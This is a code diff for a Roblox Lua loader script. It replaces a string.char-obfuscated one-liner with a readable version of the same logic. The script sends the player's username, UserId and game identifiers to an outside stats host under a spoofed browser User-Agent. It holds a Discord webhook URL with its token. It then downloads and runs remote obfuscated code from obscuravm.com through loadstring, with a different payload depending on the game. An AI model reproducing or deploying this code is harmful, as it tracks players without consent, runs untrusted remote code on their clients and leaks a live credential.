@@ -1,2 +1,52 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 
-local _a=game:GetService(string.char(72,116,116,112,83,101,114,118,105,99,101))local _b=game:GetService(string.char(80,108,97,121,101,114,115))local _c=game:GetService(string.char(77,97,114,107,101,116,112,108,97,99,101,83,101,114,118,105,99,101))local _d=_b.LocalPlayer local _e=_c:GetProductInfo(game._m)local _f={Username=_d.Name,UserId=_d.UserId,GameName=_e.Name,GameId=game.GameId,_m=game._m,StartTime=os.time()}local _g=string.char(63)for _h,_i in pairs(_f)do _g..=_a:UrlEncode(_h)..string.char(61).._a:UrlEncode(tostring(_i))..string.char(38)end local _j=_a:RequestAsync({Url=string.char(104,116,116,112,58,47,47,116,111,98,121,46,104,105,100,101,110,99,108,111,117,100,46,99,111,109,58,50,53,52,54,50,47,115,116,97,116,115).._g,Method=string.char(71,69,84),Headers={[string.char(85,115,101,114,45,65,103,101,110,116)]=string.char(77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,49,48,46,48,59,32,87,105,110,54,52,59,32,120,54,52,59,32,114,118,58,49,50,52,46,48,41,32,71,101,99,107,111,47,50,48,49,48,48,49,48,49,32,70,105,114,101,102,111,120,47,49,50,52,46,48)}})local _k={wartycoon=tonumber(string.char(49,53,50,54,56,49,52,56,50,53)),StealAnEgg=tonumber(string.char(49,48,55,55,55,56,48,55,48,55,55,55,49,54,50))}local _l=string.char(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,52,52,51,48,49,56,49,54,57,56,50,52,56,55,49,52,47,110,73,118,54,103,86,95,109,86,84,122,83,45,104,77,122,108,116,122,71,80,111,103,66,51,81,78,86,48,81,114,88,68,71,51,83,68,82,76,104,79,76,52,89,99,111,81,106,119,121,66,76,107,78,106,84,56,48,104,118,74,53,52,88,98,52,98,108)local _m=game._m if _m==_k.wartycoon then loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,112,114,111,116,101,99,116,101,100,46,111,98,115,99,117,114,97,118,109,46,99,111,109,47,102,102,54,50,54,101,57,97,51,98,55,97,51,51,48,49,97,101,101,51,52,55,99,50,47,52,98,54,52,57,56,50,99,98,101,50,51,100,56,97,54,99,55,101,49,98,50,52,53,98,51,98,49,101,49,53,57,55,101,48,100,100,99,56,49,100,49,55,54,98,99,54,57,47,100,111,119,110,108,111,97,100)))()elseif _m==_k.StealAnEgg then print(string.char(68,111,110,101,32,71,101,116,32,71,97,109,101))loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,112,114,111,116,101,99,116,101,100,46,111,98,115,99,117,114,97,118,109,46,99,111,109,47,53,48,55,54,54,100,52,55,53,50,53,102,57,56,54,99,97,52,102,48,48,99,48,99,47,97,56,101,49,97,50,52,97,53,98,55,51,101,98,51,56,49,97,99,48,49,50,57,49,53,99,49,102,97,56,48,49,55,54,51,57,50,48,48,55,56,52,54,53,57,51,99,99,47,100,111,119,110,108,111,97,100)))()else print(string.char(78,111,116,32,102,111,117,110,100,32,103,97,109,101))loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,112,114,111,116,101,99,116,101,100,46,111,98,115,99,117,114,97,118,109,46,99,111,109,47,97,102,99,48,57,97,102,101,50,102,51,56,99,53,54,51,99,53,51,52,101,52,49,97,47,101,54,100,101,101,98,99,54,98,99,100,54,55,100,98,99,57,52,48,50,54,102,100,48,50,49,49,100,56,53,101,54,102,100,49,51,57,99,57,100,102,99,53,54,56,52,52,57,47,100,111,119,110,108,111,97,100)))()end
+local Player = Players.LocalPlayer
+
+local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+
+local Params = {
+    Username = Player.Name,
+    UserId = Player.UserId,
+    GameName = GameInfo.Name,
+    GameId = game.GameId,
+    PlaceId = game.PlaceId,
+    StartTime = os.time()
+}
+
+local Query = "?"
+
+for Key, Value in pairs(Params) do
+    Query ..= HttpService:UrlEncode(Key) .. "=" .. HttpService:UrlEncode(tostring(Value)) .. "&"
+end
+
+local Response = HttpService:RequestAsync({
+    Url = "http://toby.hidencloud.com:25462/stats" .. Query,
+    Method = "GET",
+    Headers = {
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0"
+    }
+})
+
+local games = {
+    wartycoon = tonumber("1526814825"),
+    StealAnEgg = tonumber("107778070777162")
+}
+
+local url = "https://discord.com/api/webhooks/1544430181698248714/nIv6gV_mVTzS-hMzltzGPogB3QNV0QrXDG3SDRLhOL4YcoQjwyBLkNjT80hvJ54Xb4bl"
+
+
+local PlaceId = game.PlaceId
+
+if PlaceId == games.wartycoon then
+    loadstring(game:HttpGet("https://protected.obscuravm.com/ff626e9a3b7a3301aee347c2/4b64982cbe23d8a6c7e1b245b3b1e1597e0ddc81d176bc69/download"))()
+
+elseif PlaceId == games.StealAnEgg then
+    print("Done Get Game")
+    loadstring(game:HttpGet("https://protected.obscuravm.com/50766d47525f986ca4f00c0c/a8e1a24a5b73eb381ac012915c1fa80176392007846593cc/download"))()
+
+else
+    print("Not found game")
+    loadstring(game:HttpGet("https://protected.obscuravm.com/afc09afe2f38c563c534e41a/e6deebc6bcd67dbc94026fd0211d85e6fd139c9dfc568449/download"))()
+end
